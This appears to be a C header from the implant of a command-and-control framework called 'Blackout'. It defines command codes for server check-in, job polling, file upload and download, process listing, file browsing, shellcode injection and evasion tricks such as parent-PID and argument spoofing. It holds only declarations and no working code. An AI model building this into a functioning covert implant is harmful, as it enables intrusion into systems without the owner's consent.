#include <windows.h>
#include <Package.h>

#define BLACKOUT_ERROR           0x099
#define BLACKOUT_DEBUG           0x066

#define COMMAND_REGISTER         0x100
#define COMMAND_GET_JOB          0x101
#define COMMAND_NO_JOB           0x102

#define COMMAND_SLEEP            0x111
#define COMMAND_RUN              0x120
#define COMMAND_PPID             0x121
#define COMMAND_BLOCKDLLS        0x122
#define COMMAND_ARGUE            0x123
#define COMMAND_UPLOAD           0x130
#define COMMAND_DOWNLOAD         0x140
#define COMMAND_SHELLINJECT      0x150

#define COMMAND_EXITP            0x160
#define COMMAND_EXITT            0x161
#define COMMAND_PROCLIST         0x170
#define COMMAND_EXPLORER         0x180

#define COMMAND_OUTPUT           0x200

enum {
    PWD,
    LS,
    CD,
    RM,
    CAT,
    MKDIR
} Explorer;

typedef struct
{
    INT ID;
    VOID ( *Function ) ( PPARSER Arguments );
} BLACKOUT_COMMAND;

// Functions
VOID CommandDispatcher();